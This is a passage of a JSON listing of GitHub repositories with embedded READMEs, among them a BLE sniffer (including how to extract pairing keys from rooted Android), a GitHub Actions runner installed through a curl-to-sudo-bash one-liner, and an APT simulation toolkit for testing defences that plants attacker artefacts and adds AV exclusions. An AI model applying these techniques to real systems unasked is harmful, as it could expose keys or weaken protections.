"quicssh is a QUIC proxy that allows to use QUIC to connect to an SSH server without needing to patch the client or the server.", "ignoredescription": true, "id": 62, "full_name": "moul/quicssh", "url": "https://github.com/moul/quicssh", "topic_string": "server offensive quic cli proxy ssh daemon"},
{"tags": [], "owner": "mvdan", "description": "Extract urls from text", "name": "xurls", "topics_string": "", "language": "Go", "readme": "\"# xurls\\n\\n[![GoDoc](https://godoc.org/mvdan.cc/xurls?status.svg)](https://godoc.org/mvdan.cc/xurls)\\n\\nExtract urls from text using regular expressions. Requires Go 1.13 or later.\\n\\n```go\\nimport \\\"mvdan.cc/xurls/v2\\\"\\n\\nfunc main() {\\n\\trxRelaxed := xurls.Relaxed()\\n\\trxRelaxed.FindString(\\\"Do gophers live in golang.org?\\\") // \\\"golang.org\\\"\\n\\trxRelaxed.FindString(\\\"This string does not have a URL\\\") // \\\"\\\"\\n\\n\\trxStrict := xurls.Strict()\\n\\trxStrict.FindAllString(\\\"must have scheme: http://foo.com/.\\\", -1) // []string{\\\"http://foo.com/\\\"}\\n\\trxStrict.FindAllString(\\\"no scheme, no match: foo.com\\\", -1) // []string{}\\n}\\n```\\n\\nSince API is centered around [regexp.Regexp](https://golang.org/pkg/regexp/#Regexp),\\nmany other methods are available, such as finding the [byte indexes](https://golang.org/pkg/regexp/#Regexp.FindAllIndex)\\nfor all matches.\\n\\nNote that calling the exposed functions means compiling a regular expression, so\\nrepeated calls should be avoided.\\n\\n#### cmd/xurls\\n\\nTo install the tool globally:\\n\\n\\tcd $(mktemp -d); go mod init tmp; GO111MODULE=on go get mvdan.cc/xurls/v2/cmd/xurls\\n\\n```shell\\n$ echo \\\"Do gophers live in http://golang.org?\\\" | xurls\\nhttp://golang.org\\n```\\n\"", "topics": ["tld", "extract-urls"], "writeup": "Golang library for extracting URLs from text using Regex\n", "ignoredescription": true, "id": 63, "full_name": "mvdan/xurls", "url": "https://github.com/mvdan/xurls", "topic_string": "tld extract-urls"},
{"tags": [], "owner": "nasa", "description": "Information about the NASA Github organization", "name": "nasa.github.io", "topics_string": "", "language": "HTML", "readme": "\"# NASA's Public GitHub Organization\\n\\n## Purpose\\nThis organization is intended to publicly host NASA code that has been SRA-approved for open source. \\n\\n<b><i>If you are a NASA staff member, please check out these instructions for adding a code repository or getting made a collaborator: http://nasa.github.io/</i></b>\\n\\n## Visualizations of NASA Code\\nAn exploration of user engagement with NASA code repositories. Use this to find out which code has active development and might be good place to submit a pull request! https://observablehq.com/@justingosses/public-engagement-with-nasas-open-source-code-projects-on-g?collection=@justingosses/nasa-metadata\\n\\nA collection of data explorations on observable using NASA open-source code metadata: https://observablehq.com/collection/@justingosses/nasa-metadata\\n\\n## Owners\\nWe currently have two active owners in the org:\\n+ Taylor Yates (evan.t.yates@nasa.gov)\\n+ Justin Gosses (justin.c.gosses@nasa.gov)\\n\\nPlease reach out to us if you have any questions not covered in http://nasa.github.io/ or https://code.nasa.gov/#/guide\\n\\n## Related Information & Sites\\n\\n#### Please make sure any repos added here are also tracked in code.nasa.gov! \\nIn addition to being a congressional mandate, these will then get harvested into [code.gov](https://code.gov/) enabling tracking of government written code provided to the public. \\n\\n#### Other Related Sites\\n- [code.nasa.gov](https://code.nasa.gov)\\n- [data.nasa.gov](https://data.nasa.gov)\\n- [api.nasa.gov](https://api.nasa.gov)\\n- [open.nasa.gov](https://open.nasa.gov)\\n- [nasa.gov/data](https://nasa.gov/data)\\n\"", "topics": ["gov", "api", "gis", "geo"], "writeup": "", "ignoredescription": false, "id": 64, "full_name": "nasa/nasa.github.io", "url": "https://github.com/nasa/nasa.github.io", "topic_string": "gov api gis geo"},
{"tags": [], "owner": "nccgroup", "description": "A sniffer for Bluetooth 5 and 4.x LE", "name": "Sniffle", "topics_string": "", "language": "C", "readme": "\"# Sniffle\\n\\n**Sniffle is a sniffer for Bluetooth 5 and 4.x (LE) using TI CC1352/CC26x2 hardware.**\\n\\nSniffle has a number of useful features, including:\\n\\n* Support for BT5/4.2 extended length advertisement and data packets\\n* Support for BT5 Channel Selection Algorithms #1 and #2\\n* Support for all BT5 PHY modes (regular 1M, 2M, and coded modes)\\n* Support for sniffing only advertisements and ignoring connections\\n* Support for channel map, connection parameter, and PHY change operations\\n* Support for advertisement filtering by MAC address and RSSI\\n* Support for BT5 extended advertising (non-periodic)\\n* Support for capturing advertisements from a target MAC on all three primary\\n advertising channels using a single sniffer. **This makes connection detection\\n nearly 3x more reliable than most other sniffers that only sniff one advertising\\n channel.**\\n* Easy to extend host-side software written in Python\\n* PCAP export compatible with the Ubertooth\\n\\n## Prerequisites\\n\\n* TI CC26x2R Launchpad Board: <https://www.ti.com/tool/LAUNCHXL-CC26X2R1>\\n* or TI CC2652RB Launchpad Board: <https://www.ti.com/tool/LP-CC2652RB>\\n* or TI CC1352R Launchpad Board: <https://www.ti.com/tool/LAUNCHXL-CC1352R1>\\n* GNU ARM Embedded Toolchain: <https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads>\\n* TI CC26x2 SDK 4.10.00.78: <https://www.ti.com/tool/download/SIMPLELINK-CC13X2-26X2-SDK>\\n* TI SysConfig 1.4.0\\\\_1234: <https://www.ti.com/tool/download/SYSCONFIG>\\n* TI DSLite Programmer Software: see below\\n* Python 3.5+ with PySerial installed\\n\\n**If you don't want to go through the effort of setting up a build\\nenvironment for the firmware, you can just flash prebuilt firmware binaries\\nusing UniFlash/DSLite.** Prebuilt firmware binaries are attached to releases\\non the GitHub releases tab of this project. When using prebuilt firmware, be\\nsure to use the Python code corresponding to the release tag rather than master\\nto avoid compatibility issues with firmware that is behind the master branch.\\n\\nNote: it should be possible to compile Sniffle to run on CC1352P Launchpad\\nboards with minimal modifications, but I have not yet tried this.\\n\\n### Installing GCC\\n\\nThe `arm-none-eabi-gcc` provided through various Linux distributions' package\\nmanager often lacks some header files or requires some changes to linker\\nconfiguration. For minimal hassle, I suggest using the ARM GCC linked above.\\nYou can just download and extract the prebuilt executables.\\n\\n### Installing the TI SDK\\n\\nThe TI SDK is provided as an executable binary that extracts a bunch of source\\ncode once you accept the license agreement. On Linux and Mac, the default\\ninstallation directory is inside`~/ti/`. This works fine and my makefiles\\nexpect this path, so I suggest just going with the default here. The same\\napplies for the TI SysConfig tool.\\n\\nOnce the SDK has been extracted, you will need to edit one makefile to match\\nyour build environment. Within `~/ti/simplelink_cc13x2_26x2_sdk_4_10_00_78`\\n(or wherever the SDK was installed) there is a makefile named `imports.mak`.\\nThe only paths that need to be set here to build Sniffle are for GCC, XDC, and\\nSysConfig. We don't need the CCS compiler. See the diff below as an example,\\nand adapt for wherever you installed things.\\n\\n```\\ndiff --git a/imports.mak b/imports.mak\\nindex 5a8fb0cb..e99a03e7 100644\\n--- a/imports.mak\\n+++ b/imports.mak\\n@@ -18,12 +18,12 @@\\n # will build using each non-empty *_ARMCOMPILER cgtool.\\n #\\n \\n-XDC_INSTALL_DIR ?= /home/username/ti/xdctools_3_61_00_16_core\\n-SYSCONFIG_TOOL ?= /home/username/ti/ccs1000/ccs/utils/sysconfig_1.4.0/sysconfig_cli.sh\\n+XDC_INSTALL_DIR ?= $(HOME)/ti/xdctools_3_61_00_16_core\\n+SYSCONFIG_TOOL ?= $(HOME)/ti/sysconfig_1.4.0/sysconfig_cli.sh\\n \\n \\n-CCS_ARMCOMPILER ?= /home/username/ti/ccs1000/ccs/tools/compiler/ti-cgt-arm_20.2.0.LTS\\n-GCC_ARMCOMPILER ?= /home/username/ti/ccs1000/ccs/tools/compiler/gcc-arm-none-eabi-9-2019-q4-major\\n+CCS_ARMCOMPILER ?= $(HOME)/ti/ccs1000/ccs/tools/compiler/ti-cgt-arm_20.2.0.LTS\\n+GCC_ARMCOMPILER ?= $(HOME)/arm_tools/gcc-arm-none-eabi-9-2019-q4-major\\n \\n # The IAR compiler is not supported on Linux\\n # IAR_ARMCOMPILER ?=\\n```\\n\\n### Obtaining DSLite\\n\\nDSLite is TI's command line programming and debug server tool for XDS110\\ndebuggers. The CC26xx and CC13xx Launchpad boards both include XDS110 debuggers.\\nUnfortunately, TI does not provide a standalone command line DSLite download.\\nThe easiest way to obtain DSLite is to install [UniFlash](http://www.ti.com/tool/download/UNIFLASH)\\nfrom TI. It's available for Linux, Mac, and Windows. The DSLite executable will\\nbe located at `deskdb/content/TICloudAgent/linux/ccs_base/DebugServer/bin/DSLite`\\nrelative to the UniFlash installation directory. On Linux, the default UniFlash\\ninstallation directory is inside `~/ti/`.\\n\\nYou should place the DSLite executable directory within your `$PATH`.\\n\\n## Building and Installation\\n\\nOnce the GCC, DSLite, and the SDK is installed and operational, building\\nSniffle should be straight forward. Just navigate to the `fw` directory and\\nrun `make`. If you didn't install the SDK to the default directory, you may\\nneed to edit `SIMPLELINK_SDK_INSTALL_DIR` in the makefile.\\n\\nTo install Sniffle on a (plugged in) CC26x2 Launchpad using DSLite, run\\n`make load` within the `fw` directory. You can also flash the compiled\\n`sniffle.out` binary using the UniFlash GUI.\\n\\nIf building for or installing on a CC1352R Launchpad instead of a CC26x2R,\\nyou must specify `PLATFORM=CC1352R1F3`, either as an argument to make, or\\nby defining it as an environment variable prior to invoking make. Similarly,\\nspecify `PLATFORM=CC2652RB1F` when building for CC2652RB Launchpad instead of\\nthe regular CC26x2R version. Be sure to perform a `make clean` before building\\nfor a different platform.\\n\\n## Sniffer Usage\\n\\n```\\n[skhan@serpent python_cli]$ ./sniff_receiver.py --help\\nusage: sniff_receiver.py [-h] [-s SERPORT] [-c {37,38,39}] [-p] [-r RSSI]\\n [-m MAC] [-a] [-e] [-H] [-l] [-o OUTPUT]\\n\\nHost-side receiver for Sniffle BLE5 sniffer\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n -s SERPORT, --serport SERPORT\\n Sniffer serial port name\\n -c {37,38,39}, --advchan {37,38,39}\\n Advertising channel to listen on\\n -p, --pause Pause sniffer after disconnect\\n -r RSSI, --rssi RSSI Filter packets by minimum RSSI\\n -m MAC, --mac MAC Filter packets by advertiser MAC\\n -i IRK, --irk IRK Filter packets by advertiser IRK\\n -a, --advonly Sniff only advertisements, don't follow connections\\n -e, --extadv Capture BT5 extended (auxiliary) advertising\\n -H, --hop Hop primary advertising channels in extended mode\\n -l, --longrange Use long range (coded) PHY for primary advertising\\n -o OUTPUT, --output OUTPUT\\n PCAP output file name\\n```\\n\\nThe XDS110 debugger on the Launchpad boards creates two serial ports. On\\nLinux, they are typically named `ttyACM0` and `ttyACM1`. The first of the\\ntwo created serial ports is used to communicate with Sniffle. By default,\\nthe Python CLI communicates using `/dev/ttyACM0`, but you may need to\\noverride this with the `-s` command line option if you are not running on\\nLinux or have additional USB CDC-ACM devices connected.\\n\\nFor the `-r` (RSSI filter) option, a value of -40 tends to work well if the\\nsniffer is very close to or nearly touching the transmitting device. The RSSI\\nfilter is very useful for ignoring irrelevant advertisements in a busy RF\\nenvironment. The RSSI filter is only active when capturing advertisements,\\nas you always want to capture data channel traffic for a connection being\\nfollowed. You probably don't want to use an RSSI filter when MAC filtering\\nis active, as you may lose advertisements from the MAC address of interest\\nwhen the RSSI is too low.\\n\\nTo hop along with advertisements and have reliable connection sniffing, you\\nneed to set up a MAC filter with the `-m` option. You should specify the\\nMAC address of the peripheral device, not the central device. To figure out\\nwhich MAC address to sniff, you can run the sniffer with RSSI filtering while\\nplacing the sniffer near the target. This will show you advertisements from\\nthe target device including its MAC address. It should be noted that many BLE\\ndevices advertise with a randomized MAC address rather than their \\\"real\\\" fixed\\nMAC written on a label.\\n\\nFor convenience, there is a special mode for the MAC filter by invoking the\\nscript with `-m top` instead of `-m` with a MAC address. In this mode, the\\nsniffer will lock onto the first advertiser MAC address it sees that passes\\nthe RSSI filter. The `-m top` mode should thus always be used with an RSSI\\nfilter to avoid locking onto a spurious MAC address. Once the sniffer locks\\nonto a MAC address, the RSSI filter will be disabled automatically by the\\nsniff receiver script (except when the `-e` option is used).\\n\\nMost new BLE devices use Resolvable Private Addresses (RPAs) rather than fixed\\nstatic or public addresses. While you can set up a MAC filter to a particular\\nRPA, devices periodically change their RPA. RPAs can can be resolved (associated\\nwith a particular device) if the Identity Resolving Key (IRK) is known. Sniffle\\nsupports automated RPA resolution when the IRK is provided. This avoids the need\\nto keep updating the MAC filter whenever the RPA changes. You can specify an\\nIRK for Sniffle with the `-i` option; the IRK should be provided in hexadecimal\\nformat, with the most significant byte (MSB) first. Specifying an IRK allows\\nSniffle to channel hop with an advertiser the same way it does with a MAC filter.\\nThe IRK based MAC filtering feature (`-i`) is mutually exclusive with the static\\nMAC filtering feature (`-m`).\\n\\nTo enable following auxiliary pointers in Bluetooth 5 extended advertising,\\nenable the `-e` option. To improve performance and reliability in extended\\nadvertising capture, this option disables hopping on the primary advertising\\nchannels, even when a MAC filter is set up. If you are unsure whether a\\nconnection will be established via legacy or extended advertising, you can\\nenable the `-H` flag in conjunction with `-e` to perform primary channel\\nhopping with legacy advertisements, and scheduled listening to extended\\nadvertisement auxiliary packets. When combining `-e` and `-H`, the\\nreliability of connection detection may be reduced compared to hopping on\\nprimary (legacy) or secondary (extended) advertising channels alone.\\n\\nTo sniff the long range PHY on primary advertising channels, specify the `-l`\\noption. Note that no hopping between primary advertising channels is supported\\nin long range mode, since all long range advertising uses the BT5 extended\\nmechanism. Under the extended mechanism, auxiliary pointers on all three\\nprimary channels point to the same auxiliary packet, so hopping between\\nprimary channels is unnecessary.\\n\\nIf for some reason the sniffer firmware locks up and refuses to capture any\\ntraffic even with filters disabled, you should reset the sniffer MCU. On\\nLaunchpad boards, the reset button is located beside the micro USB port.\\n\\n## Scanner Usage\\n\\n```\\nsultan@sultan-neon-vm:~/sniffle/python_cli$ ./scanner.py --help\\nusage: scanner.py [-h] [-s SERPORT] [-c {37,38,39}] [-r RSSI] [-e] [-l]\\n\\nScanner utility for Sniffle BLE5 sniffer\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n -s SERPORT, --serport SERPORT\\n Sniffer serial port name\\n -c {37,38,39}, --advchan {37,38,39}\\n Advertising channel to listen on\\n -r RSSI, --rssi RSSI Filter packets by minimum RSSI\\n -e, --extadv Capture BT5 extended (auxiliary) advertising\\n -l, --longrange Use long range (coded) PHY for primary advertising\\n```\\n\\nThe scanner command line arguments work the same as the sniffer. The purpose of\\nthe scanner utility is to passively gather a list of nearby devices advertising,\\nwithout having the deluge of fast scrolling data you get with the sniffer\\nutility. The hardware/firmware works exactly the same, but the scanner utility\\nwill record and report observed MAC addresses only once without spamming the\\ndisplay. Once you're done capturing advertisements, press Ctrl-C to stop\\nscanning and report the results. The scanner will show the last advertisement\\nand scan response from each target. Scan results will be sorted by RSSI in\\ndescending order.\\n\\n## Usage Examples\\n\\nSniff all advertisements on channel 38, ignore RSSI < -50, stay on advertising\\nchannel even when CONNECT\\\\_REQs are seen.\\n\\n```\\n./sniff_receiver.py -c 38 -r -50 -a\\n```\\n\\nSniff advertisements from MAC 12:34:56:78:9A:BC, stay on advertising channel\\neven when CONNECT\\\\_REQs are seen, save advertisements to `data1.pcap`.\\n\\n```\\n./sniff_receiver.py -m 12:34:56:78:9A:BC -a -o data1.pcap\\n```\\n\\nSniff advertisements and connections for the first MAC address seen with\\nRSSI >= -40. The RSSI filter will be disabled automatically once a MAC address\\nhas been locked onto. Save captured data to `data2.pcap`.\\n\\n```\\n./sniff_receiver.py -m top -r -40 -o data2.pcap\\n```\\n\\nSniff advertisements and connections from the peripheral with big endian IRK\\n4E0BEA5355866BE38EF0AC2E3F0EBC22.\\n\\n```\\n./sniff_receiver.py -i 4E0BEA5355866BE38EF0AC2E3F0EBC22\\n```\\n\\nSniff BT5 extended advertisements and connections from nearby (RSSI >= -55) devices.\\n\\n```\\n./sniff_receiver.py -r -55 -e\\n```\\n\\nSniff legacy and extended advertisements and connections from the device with the\\nspecified MAC address. Save captured data to `data3.pcap`.\\n\\n```\\n./sniff_receiver.py -eH -m 12:34:56:78:9A:BC -o data3.pcap\\n```\\n\\nSniff extended advertisements and connections using the long range primary PHY on\\nchannel 38.\\n\\n```\\n./sniff_receiver.py -le -c 38\\n```\\n\\nPassively scan on channel 39 for advertisements with RSSI greater than -50, and\\nenable capture of extended advertising.\\n\\n```\\n./scanner.py -c 39 -e -r -50\\n```\\n\\n## Obtaining the IRK\\n\\nIf you have a rooted Android phone, you can find IRKs (and LTKs) in the Bluedroid\\nconfiguration file. On Android 8.1, this is located at `/data/misc/bluedroid/bt_config.conf`.\\nThe `LE_LOCAL_KEY_IRK` specifies the Android device's own IRK, and the first 16\\nbytes of `LE_KEY_PID` for every bonded device in the file indicate the bonded\\ndevice's IRK. Be aware that keys stored in this file are little endian, so\\n**the byte order of keys in this file will need to be reversed.** For example,\\nthe little endian IRK 22BC0E3F2EACF08EE36B865553EA0B4E needs to be changed to\\n4E0BEA5355866BE38EF0AC2E3F0EBC22 (big endian) when being passed to Sniffle with\\nthe `-i` option.\\n\"", "topics": ["sniffing", "bluetooth"], "writeup": "", "ignoredescription": false, "id": 65, "full_name": "nccgroup/Sniffle", "url": "https://github.com/nccgroup/Sniffle", "topic_string": "sniffing bluetooth"},
{"tags": [], "owner": "nektos", "description": "Run your GitHub Actions locally \ud83d\ude80", "name": "act", "topics_string": "", "language": "Go", "readme": "\"![](https://github.com/nektos/act/wiki/img/logo-150.png)\\n\\n# Overview [![push](https://github.com/nektos/act/workflows/push/badge.svg?branch=master&event=push)](https://github.com/nektos/act/actions) [![Join the chat at https://gitter.im/nektos/act](https://badges.gitter.im/nektos/act.svg)](https://gitter.im/nektos/act?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Go Report Card](https://goreportcard.com/badge/github.com/nektos/act)](https://goreportcard.com/report/github.com/nektos/act)\\n\\n> \\\"Think globally, <code>act</code> locally\\\"\\n\\nRun your [GitHub Actions](https://developer.github.com/actions/) locally! Why would you want to do this? Two reasons:\\n\\n- **Fast Feedback** - Rather than having to commit/push every time you want to test out the changes you are making to your `.github/workflows/` files (or for any changes to embedded GitHub actions), you can use `act` to run the actions locally. The [environment variables](https://help.github.com/en/actions/configuring-and-managing-workflows/using-environment-variables#default-environment-variables) and [filesystem](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners#filesystems-on-github-hosted-runners) are all configured to match what GitHub provides.\\n- **Local Task Runner** - I love [make](<https://en.wikipedia.org/wiki/Make_(software)>). However, I also hate repeating myself. With `act`, you can use the GitHub Actions defined in your `.github/workflows/` to replace your `Makefile`!\\n\\n# How Does It Work?\\n\\nWhen you run `act` it reads in your GitHub Actions from `.github/workflows/` and determines the set of actions that need to be run. It uses the Docker API to either pull or build the necessary images, as defined in your workflow files and finally determines the execution path based on the dependencies that were defined. Once it has the execution path, it then uses the Docker API to run containers for each action based on the images prepared earlier. The [environment variables](https://help.github.com/en/actions/configuring-and-managing-workflows/using-environment-variables#default-environment-variables) and [filesystem](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners#filesystems-on-github-hosted-runners) are all configured to match what GitHub provides.\\n\\nLet's see it in action with a [sample repo](https://github.com/cplee/github-actions-demo)!\\n\\n![Demo](https://github.com/nektos/act/wiki/quickstart/act-quickstart-2.gif)\\n\\n# Installation\\n\\nTo install with [Homebrew](https://brew.sh/), run:\\n\\n`brew install nektos/tap/act`\\n\\nAlternatively, you can use the following:\\n\\n`curl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash`\\n\\nIf you are running Windows, download the [latest release](https://github.com/nektos/act/releases/latest) and add the binary into your PATH. \\nIf you are using [Chocolatey](https://chocolatey.org/) then run: \\n`choco install act-cli`\\n\\nIf you are using [Scoop](https://scoop.sh/) then run: \\n`scoop install act`\\n\\nIf you are running Arch Linux, you can install the [act](https://aur.archlinux.org/packages/act/) package with your favorite package manager:\\n\\n`yay -S act`\\n\\nIf you are using NixOS or the Nix package manager on another platform you can install act globally by running\\n\\n`nix-env -iA nixpkgs.act`\\n\\nor in a shell by running\\n\\n`nix-shell -p act`\\n\\n# Commands\\n\\n```\\n# List the actions\\nact -l\\n\\n# Run the default (`push`) event:\\nact\\n\\n# Run a specific event:\\nact pull_request\\n\\n# Run a specific job:\\nact -j test\\n\\n# Run in dry-run mode:\\nact -n\\n\\n# Enable verbose-logging (can be used with any of the above commands)\\nact -v\\n```\\n\\n# Flags\\n\\n```\\n -b, --bind bind working directory to container, rather than copy\\n -C, --directory string working directory (default \\\".\\\")\\n -n, --dryrun dryrun mode\\n --env-file string environment file to read (default \\\".env\\\")\\n -e, --eventpath string path to event JSON file\\n -h, --help help for act\\n -j, --job string run job\\n -l, --list list workflows\\n -P, --platform stringArray custom image to use per platform (e.g. -P ubuntu-18.04=nektos/act-environments-ubuntu:18.04)\\n -p, --pull pull docker image(s) if already present\\n -q, --quiet disable logging of output from steps\\n -r, --reuse reuse action containers to maintain state\\n -s, --secret stringArray secret to make available to actions with optional value (e.g. -s mysecret=foo or -s mysecret)\\n --secret-file file with list of secrets to read from (e.g. --secret-file .secrets)\\n -v, --verbose verbose output\\n --version version for act\\n -w, --watch watch the contents of the local repo and run when files change\\n -W, --workflows string path to workflow files (default \\\"./.github/workflows/\\\")\\n```\\n\\n# Known Issues\\n\\nMODULE_NOT_FOUND during `docker cp` command [#228](https://github.com/nektos/act/issues/228)\\n\\n```\\nsteps:\\n - name: Checkout\\n uses: actions/checkout@v2\\n with:\\n path: \\\"your-action-root-directory\\\"\\n```\\n\\n# Runners\\n\\nGitHub Actions offers managed [virtual environments](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners) for running workflows. In order for `act` to run your workflows locally, it must run a container for the runner defined in your workflow file. Here are the images that `act` uses for each runner type:\\n\\n| GitHub Runner | Docker Image |\\n| -------------- | ----------------------------------------------------------------- |\\n| ubuntu-latest | [node:12.6-buster-slim](https://hub.docker.com/_/buildpack-deps) |\\n| ubuntu-18.04 | [node:12.6-buster-slim](https://hub.docker.com/_/buildpack-deps) |\\n| ubuntu-16.04 | [node:12.6-stretch-slim](https://hub.docker.com/_/buildpack-deps) |\\n| windows-latest | `unsupported` |\\n| windows-2019 | `unsupported` |\\n| macos-latest | `unsupported` |\\n| macos-10.15 | `unsupported` |\\n\\n## Default runners are intentionally incomplete\\n\\nThese default images do **not** contain **all** the tools that GitHub Actions offers by default in their runners.\\n\\n## Alternative runner images\\n\\nIf you need an environment that works just like the corresponding GitHub runner then consider using an image provided by [nektos/act-environments](https://github.com/nektos/act-environments):\\n\\n- [nektos/act-environments-ubuntu:18.04](https://hub.docker.com/r/nektos/act-environments-ubuntu/tags) - built from the Packer file GitHub uses in [actions/virtual-environments](https://github.com/actions/runner).\\n\\n:warning: :elephant: `*** WARNING - this image is >18GB \\ud83d\\ude31***`\\n\\n## Use an alternative runner image\\n\\nTo use a different image for the runner, use the `-P` option:\\n\\n```\\nact -P ubuntu-latest=nektos/act-environments-ubuntu:18.04\\n```\\n\\n# Secrets\\n\\nTo run `act` with secrets, you can enter them interactively or supply them as environment variables. The following options are available for providing secrets:\\n\\n- `act -s MY_SECRET=somevalue` - use `somevalue` as the value for `MY_SECRET`.\\n- `act -s MY_SECRET` - check for an environment variable named `MY_SECRET` and use it if it exists. If the environment variable is not defined, prompt the user for a value.\\n\\n# Configuration\\n\\nYou can provide default configuration flags to `act` by either creating a `./.actrc` or a `~/.actrc` file. Any flags in the files will be applied before any flags provided directly on the command line. For example, a file like below will always use the `nektos/act-environments-ubuntu:18.04` image for the `ubuntu-latest` runner:\\n\\n```\\n# sample .actrc file\\n-P ubuntu-latest=nektos/act-environments-ubuntu:18.04\\n```\\n\\nAdditionally, act supports loading environment variables from an `.env` file. The default is to look in the working directory for the file but can be overridden by:\\n\\n```\\nact --env-file my.env\\n```\\n\\n# Events\\n\\nEvery [GitHub event](https://developer.github.com/v3/activity/events/types) is accompanied by a payload. You can provide these events in JSON format with the `--eventpath` to simulate specific GitHub events kicking off an action. For example:\\n\\n```pull-request.json\\n{\\n \\\"pull_request\\\": {\\n \\\"head\\\": {\\n \\\"ref\\\": \\\"sample-head-ref\\\"\\n },\\n \\\"base\\\": {\\n \\\"ref\\\": \\\"sample-base-ref\\\"\\n }\\n }\\n}\\n```\\n\\n```\\nact -e pull-request.json\\n```\\n\\nAct will properly provide `github.head_ref` and `github.base_ref` to the action as expected.\\n\\n# Support\\n\\nNeed help? Ask on [Gitter](https://gitter.im/nektos/act)!\\n\\n# Contributing\\n\\nWant to contribute to act? Awesome! Check out the [contributing guidelines](CONTRIBUTING.md) to get involved.\\n\\n## Building from source\\n\\n- Install Go tools 1.11.4+ - (https://golang.org/doc/install)\\n- Clone this repo `git clone git@github.com:nektos/act.git`\\n- Pull the default docker image `docker pull nektos/act-environments-ubuntu:18.04`\\n- Run unit tests with `make test`\\n- Build and install: `make install`\\n\"", "topics": ["devops", "github-actions", "ci"], "writeup": "", "ignoredescription": false, "id": 66, "full_name": "nektos/act", "url": "https://github.com/nektos/act", "topic_string": "devops github-actions ci"},
{"tags": [], "owner": "NextronSystems", "description": "A toolset to make a system look as if it was the victim of an APT attack", "name": "APTSimulator", "topics_string": "", "language": "Batchfile", "readme": "\"# APT Simulator\\n\\nAPT Simulator is a Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised. In contrast to other adversary simulation tools, APT Simulator is deisgned to make the application as simple as possible. You don't need to run a web server, database or any agents on set of virtual machines. Just download the prepared archive, extract and run the contained Batch file as Administrator. Running APT Simulator takes less than a minute of your time.\\n\\n# Use Cases\\n\\n1. POCs: Endpoint detection agents / compromise assessment tools\\n2. Test your security monitoring's detection capabilities \\n3. Test your SOCs response on a threat that isn't EICAR or a port scan\\n4. Prepare an environment for digital forensics classes\\n\\n# Motives\\n\\nCustomers tested [our scanners](https://www.nextron-systems.com/compare-our-scanners/) in a POC and sent us a complaint that our scanners didn't report on programs that they had installed on their test systems. They had installed an Nmap, dropped a PsExec.exe in the Downloads folder and placed on EICAR test virus on the user's Desktop. That was the moment when I decided to build a tool that simulates a real threat in a more appropriate way.\\n\\n# Why Batch?\\n\\n- Because it's simple: Everyone can read, modify or extend it\\n- It runs on every Windows system without any prerequisites\\n- It is closest to a real attacker working on the command line\\n\\n# Focus\\n\\nThe focus of this tool is to simulate adversary activity, not malware. See the [Advanced Solutions](#advanced-solutions) section for advanced tools to simulate adversary and malware activity.\\n\\n![APT vs Malware](/screenshots/MalwareAPT.png)\\n\\n# Getting Started\\n\\n1. Download the latest release from the \\\"release\\\" section\\n2. Extract the package on a demo system (Password: apt)\\n3. Start a cmd.exe as Administrator\\n4. Navigate to the extracted program folder and run APTSimulator.bat\\n\\n# Avoiding Early Detection\\n\\nThe batch script extracts the tools and shells from an encrypted 7z archive at runtime. Do not download the master repo using the \\\"download as ZIP\\\" button. Instead use the official release from the [release](https://github.com/Neo23x0/APTSimulator/releases) section.\\n\\n## AV Excluder\\n\\nAPT Simulator contains a module named \\\"AVExcluder\\\" that tries to register the used `%APTDIR%` as AV exclusion in typical AV solutions. As I do not have access to all of the AV software products in the market, please report errors or add new exclusions as pull requests.\\n\\n# Extending the Test Cases\\n\\nSince version 0.4 it is pretty easy to extend the test sets by adding a single `.bat` file to one of the test-set category folders.\\n\\nE.g. If you want to write a simple test case for \\\"privilege escalation\\\", that uses a tool named \\\"privesc.exe\\\", clone the repo and do the following:\\n\\n1. Add your tool to the `toolset` folder\\n2. Write a new batch script `privesc-1.bat` and add it to the `./test-sets/privilege-escalation` folder\\n3. Run `build_pack.bat`\\n4. Add your test case to the table and test sets section in the README.md\\n5. Create a pull request\\n\\n## Tool and File Extraction\\n\\nIf you script includes a tool, web shell, auxiliary or output file, place them in the folders `./toolset` or `./workfiles`. Running the build script `build_pack.bat` will include them in the encrypted archives `enc-toolset.7z` and `enc-files.7z`.\\n\\n### Extract a Tool\\n\\n```batch\\n\\\"%ZIP%\\\" e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\\\\tool.exe > NUL\\n```\\n\\n### Extract a File\\n\\n```batch\\n\\\"%ZIP%\\\" e -p%PASS% %FILEARCH% -aoa -o%APTDIR% workfile\\\\tool-output.txt > NUL\\n```\\n\\n# Detection\\n\\nThe following table shows the different test cases and the expected detection results.\\n\\n- AV = Antivirus\\n- NIDS = Network Intrusion Detection System\\n- EDR = Endpoint Detection and Response\\n- SM = Security Monitoring\\n- CA = Compromise Assessment\\n\\n| Test Case | AV | NIDS | EDR | SM | CA |\\n|---------------------------------------|-----|------|-----|-----|-----|\\n| Collect Local Files | | | | | X |\\n| C2 Connects | (X) | X | X | X | |\\n| DNS Cache 1 (Cache Injection) | (X) | X | | X | X |\\n| Malicious User Agents (Malware, RATs) | | X | X | X | |\\n| Ncat Back Connect (Drop & Exec) | X | | X | X | X |\\n| WMI Backdoor C2 | | | X | X | X |\\n| LSASS Dump (with Procdump) | | | X | X | X |\\n| Mimikatz 1 (Drop & Exec) | X | | X | X | X |\\n| WCE 1 (Eventlog entries) | | | X | X | X |\\n| Active Guest Account Admin | | | X | X | X |\\n| Fake System File (Drop & Exec) | | | X | X | X |\\n| Hosts File (AV/Win Update blocks) | (X) | | X | | X |\\n| Obfuscated JS Dropper | (X) | X | X | X | X |\\n| Obfuscation (RAR with JPG ext) | | | | | (X) |\\n| Nbtscan Discovery (Scan & Output) | | X | X | (X) | X |\\n| Recon Activity (Typical Commands) | | | X | X | X |\\n| PsExec (Drop & Exec) | | | X | X | X |\\n| Remote Execution Tool (Drop) | (X) | | | | X |\\n| At Job | | | X | X | X |\\n| RUN Key Entry Creation | | | X | X | X |\\n| Scheduled Task Creation | | | X | X | X |\\n| StickyKey Backdoor | | | X | | X |\\n| UserInitMprLogonScript Persistence | | | (X) | X | X |\\n| Web Shells | X | | (X) | | X |\\n| WMI Backdoor | | | X | | X 